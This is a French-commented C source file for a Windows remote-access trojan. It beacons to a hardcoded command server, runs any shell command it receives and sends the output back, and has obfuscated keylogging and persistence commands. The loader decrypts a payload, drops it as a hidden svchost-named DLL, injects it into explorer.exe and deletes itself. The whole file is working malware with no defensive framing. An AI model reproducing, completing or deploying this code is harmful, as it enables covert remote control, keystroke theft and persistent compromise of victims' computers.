#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "../include/keylog.h"
#include "modules/config/config.h"
#include "modules/fivenine/fivenine.h"
#include "modules/injection/injection.h"

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT 4444
#define BEACON_INTERVAL_MS 5000
#define RECONNECT_DELAY_MS 30000

void hide_console() {
    HWND stealth = GetConsoleWindow();
    if (stealth != NULL) ShowWindow(stealth, SW_HIDE);
}

void decrypt_str(char *str, size_t len, char key) {
    for (size_t i = 0; i < len; i++) str[i] ^= key;
}

// ==========================================================
// CODE DU PAYLOAD
// ==========================================================
DWORD WINAPI payload_main(LPVOID lpParam) {
    char c2_addr[64] = {0};
    int c2_port = 0;

    if (config_load(c2_addr, &c2_port) != 0) {
        strcpy(c2_addr, "10.188.152.166");
        c2_port = DEFAULT_PORT;
    }

    char agent_id[32];
    snprintf(agent_id, sizeof(agent_id), "agent-%lu", (unsigned long)GetCurrentProcessId());

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(c2_addr);
    server.sin_port = htons((u_short)c2_port);

    static char buf[2048];
    static char output[65536];
    static char line[1024];
    static char result_msg[65536 + 128];

    while (1) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) { Sleep(RECONNECT_DELAY_MS); continue; }
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock); Sleep(RECONNECT_DELAY_MS); continue;
        }

        while (1) {
            memset(buf, 0, sizeof(buf));
            snprintf(buf, sizeof(buf), "BEACON %s", agent_id);
            if (send(sock, buf, (int)strlen(buf), 0) == SOCKET_ERROR) break;

            memset(buf, 0, sizeof(buf));
            int n = recv(sock, buf, sizeof(buf) - 1, 0);
            if (n <= 0) break;
            buf[n] = '\0';

            if (strcmp(buf, "NONE") == 0) {
                Sleep(BEACON_INTERVAL_MS);
                continue;
            }

            memset(output, 0, sizeof(output));
            char cmd_buf[2048];
            strncpy(cmd_buf, buf, sizeof(cmd_buf) - 1);

            char p_persist[] = {'P'^0x42, 'E'^0x42, 'R'^0x42, 'S'^0x42, 'I'^0x42, 'S'^0x42, 'T'^0x42, '\0'};
            decrypt_str(p_persist, 7, 0x42);
            char p_unpersist[] = {'U'^0x42, 'N'^0x42, 'P'^0x42, 'E'^0x42, 'R'^0x42, 'S'^0x42, 'I'^0x42, 'S'^0x42, 'T'^0x42, '\0'};
            decrypt_str(p_unpersist, 9, 0x42);
            char p_keylog[] = {'K'^0x42, 'E'^0x42, 'Y'^0x42, 'L'^0x42, 'O'^0x42, 'G'^0x42, '\0'};
            decrypt_str(p_keylog, 6, 0x42);

            if (strncmp(cmd_buf, p_persist, 7) == 0) {
                config_save(c2_addr, c2_port);
                int rc = fivenine_install();
                snprintf(output, sizeof(output), "[fivenine] install rc=%d\n", rc);
            } else if (strncmp(cmd_buf, p_unpersist, 9) == 0) {
                int rc = fivenine_uninstall();
                config_remove();
                snprintf(output, sizeof(output), "[fivenine] uninstall rc=%d\n", rc);
            } else if (strncmp(cmd_buf, p_keylog, 6) == 0) {
                char *keys = start_keylog(10);
                snprintf(output, sizeof(output), "%s", keys ? keys : "[keylog failed]");
            } else {
                FILE *fp = _popen(cmd_buf, "r");
                if (fp == NULL) {
                    snprintf(output, sizeof(output), "[!] Erreur execution\n");
                } else {
                    size_t total = 0;
                    while (fgets(line, sizeof(line), fp) != NULL) {
                        size_t len = strlen(line);
                        if (total + len < sizeof(output) - 1) {
                            strcat(output, line);
                            total += len;
                        }
                    }
                    _pclose(fp);
                }
            }

            memset(result_msg, 0, sizeof(result_msg));
            snprintf(result_msg, sizeof(result_msg), "RESULT %s %s", agent_id, output);
            if (send(sock, result_msg, (int)strlen(result_msg), 0) == SOCKET_ERROR) break;

            Sleep(BEACON_INTERVAL_MS);
        }
        closesocket(sock);
        Sleep(RECONNECT_DELAY_MS);
    }
    return 0;
}

// ==========================================================
// POINT D'ENTREE
// ==========================================================
#ifdef BUILD_DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        CreateThread(NULL, 0, payload_main, NULL, 0, NULL);
    }
    return TRUE;
}
#else
int main(int argc, char **argv) {
    hide_console();

    char localappdata[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localappdata, MAX_PATH);

    char hidden_exe[MAX_PATH];
    char hidden_dll[MAX_PATH];

    // Dossier caché
    snprintf(hidden_exe, MAX_PATH, "%s\\Microsoft\\Windows\\WebCache\\svchost.exe", localappdata);
    snprintf(hidden_dll, MAX_PATH, "%s\\Microsoft\\Windows\\WebCache\\svchost.dll", localappdata);

    char current_exe[MAX_PATH];
    GetModuleFileNameA(NULL, current_exe, MAX_PATH);

    // ========================================================
    // SCENARIO B : On est la copie cachée (Lancée par le planificateur)
    // ========================================================
    if (_stricmp(current_exe, hidden_exe) == 0) {
        if (inject_into_process("explorer.exe", hidden_dll) == 0) {
            return 0;
        } else {
            MessageBoxA(NULL, "Echec de l'injection depuis WebCache", "Debug", MB_OK | MB_ICONERROR);
            return 1;
        }
    }

    // ========================================================
    // SCENARIO A : On est le LOADER téléchargé (fsociety.exe)
    // ========================================================
    char enc_payload[MAX_PATH];
    strcpy(enc_payload, current_exe);
    char *dot = strrchr(enc_payload, '.');
    if (dot) strcpy(dot, ".enc");

    HANDLE hFile = CreateFileA(enc_payload, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err_msg[512];
        sprintf(err_msg, "Impossible de trouver le fichier .enc\n\nChemin cherche :\n%s\n\nCode erreur : %lu",
                enc_payload, GetLastError());
        MessageBoxA(NULL, err_msg, "Debug Loader", MB_OK | MB_ICONERROR);
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *pBuffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, pBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // 2. Déchiffrer
    for (DWORD i = 0; i < fileSize; i++) pBuffer[i] ^= 0x5A;

    // 3. Créer le dossier WebCache et écrire la DLL (ASTUCE DU .TMP)
    char folder[MAX_PATH];
    strcpy(folder, hidden_exe);
    char *last_slash = strrchr(folder, '\\');
    if (last_slash) *last_slash = '\0';
    CreateDirectoryA(folder, NULL);

    char temp_dll[MAX_PATH];
    strcpy(temp_dll, hidden_dll);
    strcpy(strrchr(temp_dll, '.'), ".tmp"); // On écrit en .tmp

    HANDLE hOut = CreateFileA(temp_dll, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Impossible d'ecrire la DLL dans WebCache", "Debug", MB_OK | MB_ICONERROR);
        free(pBuffer);
        return 1;
    }
    DWORD bytesWritten;
    WriteFile(hOut, pBuffer, fileSize, &bytesWritten, NULL);
    CloseHandle(hOut);
    free(pBuffer);

    // On renomme le .tmp en .dll juste après
    MoveFileExA(temp_dll, hidden_dll, MOVEFILE_REPLACE_EXISTING);

    // 4. Copier le loader dans WebCache
    CopyFileA(current_exe, hidden_exe, FALSE);

    // 5. Lancer la copie cachée
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(hidden_exe, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

    // 6. S'auto-supprimer (loader original et fichier .enc)
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del \"%s\" & del \"%s\"", current_exe, enc_payload);
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

    return 0;
}
#endif